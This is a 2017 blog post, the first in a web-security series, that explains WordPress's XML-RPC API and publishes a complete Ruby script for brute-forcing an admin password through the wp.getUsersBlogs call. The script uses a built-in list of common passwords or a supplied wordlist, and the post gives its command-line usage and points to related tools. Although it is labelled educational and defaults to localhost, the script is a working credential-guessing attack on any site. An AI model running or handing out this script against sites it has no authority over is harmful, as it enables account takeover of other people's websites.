---
layout: post
title: "Wordpress brute force password attack using XML-RPC API"
date: 2017-05-14 17:12
comments: true
categories: [wordpress hacking, web security]
description: wordpress attack, wordpres password brute force, wordpress xmlrpc api, wordpress hacking
keywords: wordpress hacking, wordpress brute force, attacking wordpress, wordpress xmlrpc api, web hacking, wordpress information gathering, wordpress security, wordpress auditing
sharing: true
---
<img src="{{ root_url }}/images/wordpress-hacking.png"/> 

#### All code and information for educational purposes only

Starting a series of posts about web security, which also a passion of mine besides development.  
The first published post on this topic about getting admin password for wordpress using [XML-RPC API](https://codex.wordpress.org/XML-RPC_WordPress_API/Users) and brute force attack. Second choice may be a direct brute force attack via post form on 'wp-login.php' which may be more complex during
'Account Lockout Policy' and other things, which I will cover in other post.

<!-- more -->

#### What is XML-RPC?
The XML-RPC is an API that enables developers create WordPress ‘apps’ (like clients, plugins and themes), that allow you to make remote HTTP requests to your WordPress site...[(link to full article)](https://blogvault.net/how-xml-rpc-affects-wordpress-security/)  
The simplest way to check if XML-RPC API enabled(default) in your wordpress is by open your browser and entering something like http://127.0.0.1:8080/xmlrpc.php, if response you see is 'XML-RPC server accepts POST requests only.', XML-RPC API enabled. 

#### Other great tools for wordpress password brute force ####
[WPScan](https://wpscan.org/) - great tool for wordpress information gathering and password brute force  
[Nmap with http-wordpress-brute script](https://nmap.org/nsedoc/scripts/http-wordpress-brute.html) - performs brute force password auditing against Wordpress CMS/blog installations.

Let's start to build simple script which will find admin password for wordpress using dictionary, I am using simple [sucuri dictionary](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Sucuri_Top_Wordpress_Passwords.txt) as default for out brute force attack.

Our script will use [xml-rpc client for ruby](https://ruby-doc.org/stdlib-2.3.1/libdoc/xmlrpc/rdoc/XMLRPC/Client.html)


#### wp_find_password.rb script
``` ruby 
#!/usr/bin/env ruby
# encoding: UTF-8

require 'optparse'
require 'xmlrpc/client'
require 'uri'


def wp_find_password(options)
  # https://github.com/danielmiessler/SecLists/blob/master/Passwords/Sucuri_Top_Wordpress_Passwords.txt
  passwords = %w(admin 123456 password 12345678 typhoon 666666 111111 1234567 qwerty
                 siteadmin qwerty siteadmin administrator root 123123 123321
                 1234567890 letmein123 test123 demo123 pass123 123qwe qwe123 654321 loveyou adminadmin123)

  uri = URI(options[:url])
  server = XMLRPC::Client.new(uri.host, uri.path, uri.port)
  server.http_header_extra = {'accept-encoding' => 'identity'}
  
  if options[:wordlist] != 'default'
    passwords = File.readlines(options[:wordlist])
    passwords.collect! {|s| s.chomp}
  end
  
  passwords.each do |password|
    begin
      response = server.call("wp.getUsersBlogs", options[:username], password)
      if response
        puts "--- Success: PASSWORD: #{password} for username: #{options[:username]} ---\n"
        break;
      end
    rescue XMLRPC::FaultException => e
      puts "Wrong password: #{password} for username: #{options[:username]}, response code #{e.faultCode}\n"
    end
  end
end

options = {:url => 'http://127.0.0.1:8080/wordpress/xmlrpc.php', :username => 'admin', :wordlist => 'default'}

OptionParser.new do |opts|
  opts.banner = "Usage: wp_find_password.rb [options]"
  opts.on('--username username', 'Username, default: admin') do |username|
    options[:username] = username
  end

  opts.on('--url url', 'Url, default: http://127.0.0.1/wordpress/xmlrpc.php') do |url|
    options[:url] = url
  end

  opts.on('--wordlist wordlist', 'Word List, default: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Sucuri_Top_Wordpress_Passwords.txt') do |wordlist|
    options[:wordlist] = wordlist
  end

  opts.on('-h', '--help', 'Displays Help') do
    puts opts
    exit
  end
end.parse!

wp_find_password(options)
``` 

You may download this script [here](https://github.com/warolv/wordpress-scripts)

Usage example: wp_find_password.rb --url 127.0.0.1:8080/wordpress/xmlrpc.php  --wordlist /Users/your-user/Downloads/wordlist.txt --username admin

Options:
Usage: wp_find_password.rb [options]
        --username username          Username, default: admin
        --url url                    Url, default: http://127.0.0.1/wordpress/xmlrpc.php
        --wordlist wordlist          Dictionary
    -h, --help                       Displays Help